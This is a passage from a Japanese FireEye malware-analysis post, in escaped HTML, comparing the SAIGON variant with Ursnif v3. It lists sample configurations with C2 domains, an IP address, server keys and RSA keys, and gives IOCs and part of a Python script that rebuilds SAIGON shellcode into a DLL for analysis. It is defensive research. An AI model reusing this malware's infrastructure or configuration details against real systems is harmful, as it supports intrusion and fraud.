width=\u0022221\u0022\u003E\u003Cp\u003EaPLib\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u6697\u53f7\u5316 \/ \u5fa9\u53f7\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003ESerpent \u003Cb\u003ECBC\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003ESerpent \u003Cb\u003EECB\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u30c7\u30fc\u30bf\u6574\u5408\u6027\u691c\u8a3c\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003ERSA\u30b7\u30b0\u30cd\u30c1\u30e3\u30fc\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003ERSA\u30b7\u30b0\u30cd\u30c1\u30e3\u30fc\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u901a\u4fe1\u65b9\u6cd5\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003EHTTP POST\u30ea\u30af\u30a8\u30b9\u30c8\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003EHTTP POST\u30ea\u30af\u30a8\u30b9\u30c8\u003Cbr\u003E\n\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u30da\u30a4\u30ed\u30fc\u30c9\u306e\u30a8\u30f3\u30b3\u30fc\u30c7\u30a3\u30f3\u30b0\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003EBase64\u30d1\u30c7\u30a3\u30f3\u30b0\u306a\u3057\uff08\u300c+\u300d\u306f \u300c\u003Cb\u003E\u0027_2B\u003C\/b\u003E\u300d\u306b\u3001\u300c\/\u300d\u306f\u300c\u003Cb\u003E_2F\u003C\/b\u003E\u300d\u306b\u7f6e\u63db\u3055\u308c\u308b\uff09\u3001\u003Cb\u003E\u30e9\u30f3\u30c0\u30e0\u306a\u30b9\u30e9\u30c3\u30b7\u30e5\u304c\u8ffd\u52a0\u3055\u308c\u308b\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003EBase64\u30d1\u30c7\u30a3\u30f3\u30b0\u306a\u3057\uff08\u300c+\u300d\u306f \u300c\u003Cb\u003E%2B\u003C\/b\u003E\u300d\u306b\u3001\u300c\/\u300d\u306f\u300c\u003Cb\u003E%2F\u003C\/b\u003E\u300d\u306b\u7f6e\u63db\u3055\u308c\u308b\uff09\u3001\u003Cb\u003E\u30e9\u30f3\u30c0\u30e0\u306a\u30b9\u30e9\u30c3\u30b7\u30e5\u306f\u306a\u3057\u003C\/b\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003E\u003Ci\u003EURL\u30d1\u30b9\u6a21\u5023\u003C\/i\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u4f7f\u7528\u3059\u308b\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u4f7f\u7528\u3057\u306a\u3044\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003Ctr\u003E\u003Ctd width=\u0022188\u0022\u003E\u003Cp\u003EPX\u30d5\u30a1\u30a4\u30eb\u30fb\u30d5\u30a9\u30fc\u30de\u30c3\u30c8\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u4f7f\u7528\u3059\u308b\u003C\/p\u003E\n\u003C\/td\u003E\n\u003Ctd width=\u0022221\u0022\u003E\u003Cp\u003E\u4f7f\u7528\u3057\u306a\u3044\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003E\u88684\uff1aUrsnif v3\u3068SAIGON\u306e\u30b5\u30f3\u30d7\u30eb\u306e\u985e\u4f3c\u70b9\u3068\u76f8\u9055\u70b9\u003Cbr\u003E\n\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u56f34\u306b\u3001Ursnif v3\u306b\u3088\u308bURL\u30d1\u30b9\u306e\u6a21\u5023\u306e\u4f7f\u7528\u3092\u793a\u3057\u3066\u3044\u307e\u3059\u3002\u3053\u306e\u6226\u8853\u306f\u3001SAIGON\u3092\u542b\u3080Ursnif\u306e\u4ed6\u306e\u4e9c\u7a2e\u3067\u306f\u898b\u3089\u308c\u307e\u305b\u3093\u3002\u003Cbr\u003E\n\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/saigon\/Picture4.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003E\u56f34\uff1aUrsnif v3\u306e\u6a21\u5023\u4f8b\u3002\u8d64\uff1a\u6b63\u5e38\u306a\u30d6\u30e9\u30a6\u30b6\u30fb\u30c8\u30e9\u30d5\u30a3\u30c3\u30af\u3067\u4ee5\u524d\u306b\u898b\u3089\u308c\u305f\u6a21\u5023\u3001\u7dd1\uff1aSAIGON\u306e\u30b5\u30f3\u30d7\u30eb\u3067\u306f\u898b\u3089\u308c\u306a\u3044\u003C\/span\u003E\u003Cbr\u003E\n\u003C\/p\u003E\n\u003Ch4\u003E\u63a8\u6e2c\u003Cbr\u003E\n\u003C\/h4\u003E\n\u003Cp\u003E\u73fe\u5728\u3001SAIGON\u304cUrsnif\u30de\u30eb\u30a6\u30a7\u30a2\u30fb\u30a8\u30b3\u30b7\u30b9\u30c6\u30e0\u306b\u304a\u3044\u3066\u3001\u5e45\u5e83\u3044\u9032\u5316\u3092\u793a\u3057\u3066\u3044\u308b\u304b\u3069\u3046\u304b\u306f\u4e0d\u660e\u3067\u3059\u3002\u3053\u308c\u307e\u3067\u306b\u78ba\u8a8d\u3055\u308c\u305fSAIGON\u306e\u30b5\u30f3\u30d7\u30eb\u6570\u304c\u5c11\u306a\u3044\u3053\u3068\uff08\u305d\u306e\u3059\u3079\u3066\u306e\u30b3\u30f3\u30d1\u30a4\u30eb\u6642\u306e\u30bf\u30a4\u30e0\u30b9\u30bf\u30f3\u30d7\u306f2018\u5e74\uff09\u306f\u3001SAIGON\u304c\u5c11\u6570\u306e\u653b\u6483\u306b\u5408\u308f\u305b\u305fUrsnif v3\u306e\u4e00\u6642\u7684\u306a\u30d6\u30e9\u30f3\u30c1\u3067\u3042\u308b\u3053\u3068\u3092\u793a\u3057\u3066\u3044\u308b\u53ef\u80fd\u6027\u304c\u3042\u308a\u307e\u3059\u3002\u7279\u306b\u3001SAIGON\u306e\u6a5f\u80fd\u306f\u3001\u5178\u578b\u7684\u306a\u30d0\u30f3\u30ad\u30f3\u30b0\u30fb\u30de\u30eb\u30a6\u30a7\u30a2\u3068\u7570\u306a\u308a\u3001\u6a19\u7684\u578b\u306e\u4fb5\u5165\u653b\u6483\u306e\u30b5\u30dd\u30fc\u30c8\u306b\u9069\u3057\u3066\u3044\u308b\u3068\u8003\u3048\u3089\u308c\u307e\u3059\u3002\u3053\u306e\u63a8\u6e2c\u306f\u3001POS\u3078\u306e\u653b\u6483\u3067\u4f7f\u7528\u3055\u308c\u308b\u30c4\u30fc\u30eb\u306e\u30db\u30b9\u30c8\u30fb\u30b5\u30fc\u30d0\u30fc\u4e0a\u3067SAIGON\u3092\u4e8b\u524d\u306b\u78ba\u8a8d\u3057\u305f\u3053\u3068\u3068\u3001FIN8\u304c\u4ee5\u524d\u306b\u4f7f\u7528\u3057\u305f\u30c4\u30fc\u30eb\u3068\u5171\u306b\u3001\u4fb5\u5bb3\u3055\u308c\u305f\u30b5\u30fc\u30d3\u30b9\u7d44\u7e54\u306e\u30cd\u30c3\u30c8\u30ef\u30fc\u30af\u4e0a\u306b\u51fa\u73fe\u3057\u305f\u30de\u30eb\u30a6\u30a7\u30a2\u306b\u95a2\u3059\u308b\u003Ca href=\u0022https:\/\/usa.visa.com\/dam\/VCOM\/global\/support-legal\/documents\/cybercrime-groups-targeting-fuel-dispenser-merchants.pdf\u0022 target=\u0022_blank\u0022 adhocenable=\u0022false\u0022\u003EVISA\u003C\/a\u003E\u306e\u6700\u8fd1\u306e\u901a\u77e5\u304b\u3089\u3082\u88cf\u4ed8\u3051\u3089\u308c\u307e\u3059\u3002\u003C\/p\u003E\n\u003Ch4\u003E\u8b1d\u8f9e\u003Cbr\u003E\n\u003C\/h4\u003E\n\u003Cp\u003E\u3053\u306e\u8a18\u4e8b\u57f7\u7b46\u3092\u30b5\u30dd\u30fc\u30c8\u3057\u3066\u304f\u308c\u305fKimberly Goody\u3001Jeremy Kennelly\u3001James Wyke\u306b\u611f\u8b1d\u3057\u307e\u3059\u3002\u003Cbr\u003E\n\u003C\/p\u003E\n\u003Ch4\u003E\u4ed8\u9332A\uff1a\u30b5\u30f3\u30d7\u30eb\u003Cbr\u003E\n\u003C\/h4\u003E\n\u003Cp\u003E\u4ee5\u4e0b\u306f\u57cb\u3081\u8fbc\u307f\u306e\u8a2d\u5b9a\u3092\u542b\u3080\u30b5\u30f3\u30d7\u30eb\u3067\u3059\u3002\u003Cbr\u003E\n\u003C\/p\u003E\n\u003Cp\u003ESample SHA256: 8ded07a67e779b3d67f362a9591cce225a7198d2b86ec28bbc3e4ee9249da8a5\u003Cbr\u003E\nSample Version: 3.50.132\u003Cbr\u003E\nPE Timestamp: 2018-07-07T14:51:30\u003Cbr\u003E\nXOR Cookie: 0x40d822d9\u003Cbr\u003E\nC2 URLs:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Ehttps:\/\/google-download[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-google-eu[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-gmail-us[.]com\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EGroup \/ Botnet ID: 1001\u003Cbr\u003E\nServer Key: rvXxkdL5DqOzIRfh\u003Cbr\u003E\nIdle Period: 30\u003Cbr\u003E\nLoad Period: 300\u003Cbr\u003E\nHost Keep Time: 1440\u003Cbr\u003E\nRSA Public Key: (0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b1502ccb5c\u003Cbr\u003E\n021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f593518a2cf4915\u003Cbr\u003E\nd0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)\u003C\/p\u003E\n\u003Cp\u003ESample SHA256: c6a27a07368abc2b56ea78863f77f996ef4104692d7e8f80c016a62195a02af6\u003Cbr\u003E\nSample Version: 3.50.132\u003Cbr\u003E\nPE Timestamp: 2018-07-07T14:51:41\u003Cbr\u003E\nXOR Cookie: 0x40d822d9\u003Cbr\u003E\nC2 URLs:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Ehttps:\/\/google-download[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-google-eu[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-gmail-us[.]com\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EGroup \/ Botnet ID: 1001\u003Cbr\u003E\nServer Key: rvXxkdL5DqOzIRfh\u003Cbr\u003E\nIdle Period: 30\u003Cbr\u003E\nLoad Period: 300\u003Cbr\u003E\nHost Keep Time: 1440\u003Cbr\u003E\nRSA Public Key: (0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b1502ccb5c\u003Cbr\u003E\n021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f593518a2cf4915\u003Cbr\u003E\nd0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)\u003C\/p\u003E\n\u003Cp\u003ESample SHA256: 431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2e\u003Cbr\u003E\nSample Version: 3.50.199\u003Cbr\u003E\nPE Timestamp: 2018-11-15T11:17:09\u003Cbr\u003E\nXOR Cookie: 0x40d822d9\u003Cbr\u003E\nC2 URLs:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Ehttps:\/\/mozilla-yahoo[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-mozilla-sn45[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-digicert-i31[.]com\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EGroup \/ Botnet ID: 1000\u003Cbr\u003E\nServer Key: rvXxkdL5DqOzIRfh\u003Cbr\u003E\nIdle Period: 60\u003Cbr\u003E\nLoad Period: 300\u003Cbr\u003E\nHost Keep Time: 1440\u003Cbr\u003E\nRSA Public Key: (0xd2185e9f2a77f781526f99baf95dff7974e15feb4b7c7a025116dec10aec8b38c808f5f0bb21ae575672b15\u003Cbr\u003E\n02ccb5c021c565359255265e0ca015290112f3b6cb72c7863309480f749e38b7d955e410cb53fb3ecf7c403f5\u003Cbr\u003E\n93518a2cf4915d0ff70c3a536de8dd5d39a633ffef644b0b4286ba12273d252bbac47e10a9d3d059, 0x10001)\u003C\/p\u003E\n\u003Cp\u003ESample SHA256: 628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9\u003Cbr\u003E\nSample Version: 3.50.209\u003Cbr\u003E\nPE Timestamp: 2018-12-04T10:47:56\u003Cbr\u003E\nXOR Cookie: 0x40d822d9\u003Cbr\u003E\nC2 URLs\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Ehttp:\/\/softcloudstore[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttp:\/\/146.0.72.76\u003C\/li\u003E\n\u003Cli\u003Ehttp:\/\/setworldtime[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/securecloudbase[.]com\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EBotnet ID: 1000\u003Cbr\u003E\nServer Key: 0123456789ABCDEF\u003Cbr\u003E\nIdle Period: 20\u003Cbr\u003E\nMinimum Uptime: 300\u003Cbr\u003E\nLoad Period: 1800\u003Cbr\u003E\nHost Keep Time: 360\u003Cbr\u003E\nRSA Public Key: (0xdb7c3a9ea68fbaf5ba1aebc782be3a9e75b92e677a114b52840d2bbafa8ca49da40a64664d80cd62d9453\u003Cbr\u003E\n34f8457815dd6e75cffa5ee33ae486cb6ea1ddb88411d97d5937ba597e5c430a60eac882d8207618d14b660\u003Cbr\u003E\n70ee8137b4beb8ecf348ef247ddbd23f9b375bb64017a5607cb3849dc9b7a17d110ea613dc51e9d2aded, 0x10001)\u003C\/p\u003E\n\u003Ch4\u003E\u4ed8\u9332B\uff1aIOC\u003Cbr\u003E\n\u003C\/h4\u003E\n\u003Cp\u003ESample hashes:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E8ded07a67e779b3d67f362a9591cce225a7198d2b86ec28bbc3e4ee9249da8a5\u003C\/li\u003E\n\u003Cli\u003Ec6a27a07368abc2b56ea78863f77f996ef4104692d7e8f80c016a62195a02af6\u003C\/li\u003E\n\u003Cli\u003E431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2e [\u003Ca href=\u0022https:\/\/www.virustotal.com\/gui\/file\/431f83b1af8ab7754615adaef11f1d10201edfef4fc525811c2fcda7605b5f2e\u0022 target=\u0022_blank\u0022 adhocenable=\u0022false\u0022\u003EVT\u003C\/a\u003E]\u003C\/li\u003E\n\u003Cli\u003E628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9 [\u003Ca href=\u0022https:\/\/www.virustotal.com\/gui\/file\/628cad1433ba2573f5d9fdc6d6ac2c7bd49a8def34e077dbbbffe31fb6b81dc9\u0022 target=\u0022_blank\u0022 adhocenable=\u0022false\u0022\u003EVT\u003C\/a\u003E]\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EC2 servers:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Ehttps:\/\/google-download[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-google-eu[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-gmail-us[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/mozilla-yahoo[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-mozilla-sn45[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/cdn-digicert-i31[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttp:\/\/softcloudstore[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttp:\/\/146.0.72.76\u003C\/li\u003E\n\u003Cli\u003Ehttp:\/\/setworldtime[.]com\u003C\/li\u003E\n\u003Cli\u003Ehttps:\/\/securecloudbase[.]com\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EUser-Agent:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u0026quot;Mozilla\/5.0 (Windows NT \u003Ci\u003E\u0026lt;os_version\u0026gt;\u003C\/i\u003E; rv:58.0) Gecko\/20100101 Firefox\/58.0\u0026quot;\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EOther host-based indicators:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u0026quot;Power\u003Ci\u003E\u0026lt;random_string\u0026gt;\u003C\/i\u003E\u0026quot; scheduled task\u003C\/li\u003E\n\u003Cli\u003E\u0026quot;PsRun\u0026quot; value under the HKCU\\Identities\\{\u003Ci\u003E\u0026lt;random_guid\u0026gt;\u003C\/i\u003E} registry key\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Ch4\u003E\u4ed8\u9332C\uff1a\u30b7\u30a7\u30eb\u30b3\u30fc\u30c9\u30fb\u30b3\u30f3\u30d0\u30fc\u30bf\u30fc\u306e\u30b9\u30af\u30ea\u30d7\u30c8\u003Cbr\u003E\n\u003C\/h4\u003E\n\u003Cp\u003E\u4ee5\u4e0b\u306ePython\u30b9\u30af\u30ea\u30d7\u30c8\u306f\u3001\u3053\u306e\u30de\u30eb\u30a6\u30a7\u30a2\u306e\u89e3\u6790\u3092\u5bb9\u6613\u306b\u3059\u308b\u3053\u3068\u3092\u76ee\u7684\u306b\u4f5c\u6210\u3055\u308c\u307e\u3057\u305f\u3002\u3053\u306e\u30b9\u30af\u30ea\u30d7\u30c8\u306f\u3001PE\u30ed\u30fc\u30c0\u30fc\u3092\u524a\u9664\u3057\u3001PE\u30d8\u30c3\u30c0\u30fc\u3092\u5fa9\u5143\u3059\u308b\u3053\u3068\u306b\u3088\u3063\u3066\u3001SAIGON\u30b7\u30a7\u30eb\u30b3\u30fc\u30c9\u3092\u5143\u306eDLL\u5f62\u5f0f\u306b\u623b\u3057\u307e\u3059\u3002\u3053\u308c\u3089\u306e\u5909\u66f4\u306b\u3088\u308a\u3001SAIGON\u30b7\u30a7\u30eb\u30b3\u30fc\u30c9\u306e\u89e3\u6790\u304c\u5927\u5e45\u306b\u30b7\u30f3\u30d7\u30eb\u306b\u306a\u308a\u307e\u3059\uff08\u305f\u3068\u3048\u3070\u3001IDA\u306b\u30d5\u30a1\u30a4\u30eb\u3092\u30ed\u30fc\u30c9\u3067\u304d\u308b\u3088\u3046\u306b\u306a\u308a\u307e\u3059\uff09\u3002\u305f\u3060\u3057\u3001\u30de\u30eb\u30a6\u30a7\u30a2\u304c\u30d7\u30ed\u30bb\u30b9\u306e\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u3092\u5b9f\u884c\u3059\u308b\u6bb5\u968e\u3067PE\u30ed\u30fc\u30c0\u30fc\uff08\u73fe\u5728\u306f\u524a\u9664\u6e08\u307f\uff09\u3092\u5229\u7528\u3059\u308b\u305f\u3081\u3001\u30c7\u30d0\u30c3\u30ac\u3067\u5b9f\u884c\u3059\u308b\u3068\u3001\u4f5c\u6210\u3055\u308c\u305fDLL\u306f\u30af\u30e9\u30c3\u30b7\u30e5\u3057\u305f\u307e\u307e\u306b\u306a\u308a\u307e\u3059\u3002\u3053\u306e\u5909\u63db\u30d7\u30ed\u30bb\u30b9\u306e\u5f8c\u3001\u30b5\u30f3\u30d7\u30eb\u306f\u30b5\u30a4\u30ba\u304c\u5c0f\u3055\u304f\u3001\u96e3\u8aad\u5316\u3055\u308c\u3066\u3044\u306a\u3044\u305f\u3081\u3001\u6bd4\u8f03\u7684\u7c21\u5358\u306b\u89e3\u6790\u3067\u304d\u307e\u3059\u3002\u003C\/p\u003E\n\u003Ctable cellspacing=\u00220\u0022 cellpadding=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd width=\u0022623\u0022 valign=\u0022top\u0022\u003E\u003Cp\u003E#!\/usr\/bin\/env python3\u003Cbr\u003E\nimport argparse\u003Cbr\u003E\nimport struct\u003Cbr\u003E\nfrom datetime import datetime\u003C\/p\u003E\n\u003Cp\u003EMZ_HEADER = bytes.fromhex(\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u00274d5a90000300000004000000ffff0000\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0027b8000000000000004000000000000000\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u002700000000000000000000000000000000\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u002700000000000000000000000080000000\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u00270e1fba0e00b409cd21b8014ccd215468\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u002769732070726f6772616d2063616e6e6f\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0027742062652072756e20696e20444f5320\u0027\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u00276d6f64652e0d0d0a2400000000000000\u0027\u003Cbr\u003E\n)\u003C\/p\u003E\n\u003Cp\u003Edef main():\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; parser = argparse.ArgumentParser(description=\u0026quot;Shellcode to PE converter for the Saigon malware family.\u0026quot;)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; parser.add_argument(\u0026quot;sample\u0026quot;)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; args = parser.parse_args()\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; with open(args.sample, \u0026quot;rb\u0026quot;) as f:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; data = bytearray(f.read())\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; if data.startswith(b\u0027MZ\u0027):\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; lfanew = struct.unpack_from(\u0027=I\u0027, data, 0x3c)[0]\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; print(\u0027This is already an MZ\/PE file.\u0027)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; return\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; elif not data.startswith(b\u0027\\xe9\u0027):\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; print(\u0027Unknown file type.\u0027)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; return\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; struct.pack_into(\u0027=I\u0027, data, 0, 0x00004550)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; if data[5] == 0x01:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=H\u0027, data, 4, 0x14c)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; elif data[5] == 0x86:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=H\u0027, data, 4, 0x8664)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; else:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; print(\u0027Unknown architecture.\u0027)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; return\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; # file alignment\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=I\u0027, data, 0x3c, 0x200)\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; optional_header_size, _ = struct.unpack_from(\u0027=HH\u0027, data, 0x14)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; magic, _, _, size_of_code = struct.unpack_from(\u0027=HBBI\u0027, data, 0x18)\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; print(\u0027Magic:\u0027, hex(magic))\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; print(\u0027Size of code:\u0027, hex(size_of_code))\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; base_of_code, base_of_data = struct.unpack_from(\u0027=II\u0027, data, 0x2c)\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; if magic == 0x20b:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; # base of data, does not exist in PE32+\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; if size_of_code \u0026amp; 0x0fff:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; tmp = (size_of_code \u0026amp; 0xfffff000) + 0x1000\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; else:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; tmp = size_of_code\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; base_of_data = base_of_code + tmp\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; print(\u0027Base of code:\u0027, hex(base_of_code))\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; print(\u0027Base of data:\u0027, hex(base_of_data))\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; data[0x18 + optional_header_size : 0x1000] = b\u0027\\0\u0027 * (0x1000 - 0x18 - optional_header_size)\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; size_of_header = struct.unpack_from(\u0027=I\u0027, data, 0x54)[0]\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; data_size = 0x3000\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; pos = data.find(struct.pack(\u0027=IIIII\u0027, 3, 5, 7, 11, 13))\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; if pos \u0026gt;= 0:\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; data_size = pos - base_of_data\u003C\/p\u003E\n\u003Cp\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; section = 0\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; struct.pack_into(\u0027=8sIIIIIIHHI\u0027, data, 0x18 + optional_header_size + 0x28 * section,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b\u0027.text\u0027,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; size_of_code, base_of_code,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; base_of_data - base_of_code, size_of_header,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0, 0,\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0x60000020\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n\u0026nbsp; \u0026nbsp; section += 